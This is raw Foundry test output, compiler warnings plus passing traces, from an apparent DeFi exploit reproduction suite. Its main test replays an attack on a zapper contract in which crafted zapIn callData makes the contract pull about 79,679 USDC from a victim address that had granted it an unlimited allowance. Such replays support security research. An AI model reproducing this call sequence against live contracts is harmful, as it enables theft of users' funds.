Compiling 25 files with Solc 0.8.10
Compiling 26 files with Solc 0.8.25
Solc 0.8.10 finished in 882.17ms
Solc 0.8.25 finished in 955.93ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/BrahTOPG_exp.sol:25:5:
   |
25 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/BrahTOPG_exp.sol:26:5:
   |
26 |     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2022-11/BrahTOPG_exp.sol:38:9:
   |
38 |         address(WETH).call{value: 1e15}("");
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2022-11/BrahTOPG_exp.sol:71:5:
   |
71 |     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2022-11/BrahTOPG_exp.sol:75:5:
   |
75 |     function balanceOf(address account) external view returns (uint256) {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 245.27ms (194.75µs CPU time)

Ran 1 test for src/test/2022-11/BrahTOPG_exp.sol:ContractTest
[PASS] testExploit() (gas: 297518)
Logs:
  [End] Attacker USDC balance after exploit: 79679.661825

Traces:
  [370418] ContractTest::testExploit()
    ├─ [23731] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::fallback{value: 1000000000000000}()
    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 1000000000000000 [1e15])
    │   └─ ← [Stop] 
    ├─ [24420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1000000000000000 [1e15]
    ├─ [87533] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForTokensSupportingFeeOnTransferTokens(1000000000000000 [1e15], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x853d955aCEf822Db058eb8505911ED77F175b99e], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1668012935 [1.668e9])
    │   ├─ [8225] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76, 1000000000000000 [1e15])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76, value: 1000000000000000 [1e15])
    │   │   └─ ← [Return] true
    │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2504] 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76::getReserves() [staticcall]
    │   │   └─ ← [Return] 4734807427443384865660 [4.734e21], 3963363026599028989 [3.963e18], 1668012119 [1.668e9]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76) [staticcall]
    │   │   └─ ← [Return] 3964363026599028989 [3.964e18]
    │   ├─ [60746] 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76::swap(1190760418702636444 [1.19e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [28223] 0x853d955aCEf822Db058eb8505911ED77F175b99e::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1190760418702636444 [1.19e18])
    │   │   │   ├─ emit Transfer(from: 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1190760418702636444 [1.19e18])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76) [staticcall]
    │   │   │   └─ ← [Return] 4733616667024682229216 [4.733e21]
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76) [staticcall]
    │   │   │   └─ ← [Return] 3964363026599028989 [3.964e18]
    │   │   ├─ emit Sync(reserve0: 4733616667024682229216 [4.733e21], reserve1: 3964363026599028989 [3.964e18])
    │   │   ├─ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 0, amount1In: 1000000000000000 [1e15], amount0Out: 1190760418702636444 [1.19e18], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 1190760418702636444 [1.19e18]
    │   └─ ← [Stop] 
    ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3) [staticcall]
    │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3) [delegatecall]
    │   │   └─ ← [Return] 79679661825 [7.967e10]
    │   └─ ← [Return] 79679661825 [7.967e10]
    ├─ [3426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, 0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   ├─ [2637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, 0xD248B30A3207A766d318C7A87F5Cf334A439446D) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007903129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007903129639935 [1.157e77]
    ├─ [181806] 0xD248B30A3207A766d318C7A87F5Cf334A439446D::zapIn(ZapData({ requiredToken: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amountIn: 1, minAmountOut: 0, allowanceTarget: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, swapTarget: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, callData: 0x23b872dd000000000000000000000000a19789f57d0e0225a82eeff0fecb9f3776f276a30000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000128d472701 }))
    │   ├─ [2404] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::zapper() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000d248b30a3207a766d318c7a87f5cf334a439446d
    │   ├─ [569] ContractTest::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD248B30A3207A766d318C7A87F5Cf334A439446D, 1)
    │   │   └─ ← [Return] true
    │   ├─ [327] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::wantToken() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000853d955acef822db058eb8505911ed77f175b99e
    │   ├─ [327] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::wantToken() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000853d955acef822db058eb8505911ed77f175b99e
    │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [378] ContractTest::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [24485] ContractTest::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   │   ├─ [23423] 0x853d955aCEf822Db058eb8505911ED77F175b99e::transfer(0xD248B30A3207A766d318C7A87F5Cf334A439446D, 10)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xD248B30A3207A766d318C7A87F5Cf334A439446D, value: 10)
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [41492] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 79679661825 [7.967e10])
    │   │   ├─ [40697] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 79679661825 [7.967e10]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 79679661825 [7.967e10])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
    │   │   └─ ← [Return] 10
    │   ├─ [327] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::wantToken() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000853d955acef822db058eb8505911ed77f175b99e
    │   ├─ [24733] 0x853d955aCEf822Db058eb8505911ED77F175b99e::approve(0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3, 10)
    │   │   ├─ emit Approval(owner: 0xD248B30A3207A766d318C7A87F5Cf334A439446D, spender: 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3, value: 10)
    │   │   └─ ← [Return] true
    │   ├─ [63297] 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3::deposit(10, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [2474] 0xD2A0B3B0cEf4F4dCdd9F41dc2802010987D8d2e7::getSlippageAccountedAmount(10)
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000a
    │   │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3) [staticcall]
    │   │   │   └─ ← [Return] 72428494116542870975961 [7.242e22]
    │   │   ├─ [8974] 0x853d955aCEf822Db058eb8505911ED77F175b99e::transferFrom(0xD248B30A3207A766d318C7A87F5Cf334A439446D, 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3, 10)
    │   │   │   ├─ emit Transfer(from: 0xD248B30A3207A766d318C7A87F5Cf334A439446D, to: 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3, value: 10)
    │   │   │   ├─ emit Approval(owner: 0xD248B30A3207A766d318C7A87F5Cf334A439446D, spender: 0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3, value: 0)
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 9)
    │   │   └─ ← [Return] 9
    │   ├─ emit ZappedIn(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 1, param3: 9)
    │   └─ ← [Stop] 
    ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 79679661825 [7.967e10]
    │   └─ ← [Return] 79679661825 [7.967e10]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDC balance after exploit", val: 79679661825 [7.967e10], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 296.51ms (6.56ms CPU time)

Ran 2 test suites in 297.29ms (541.77ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
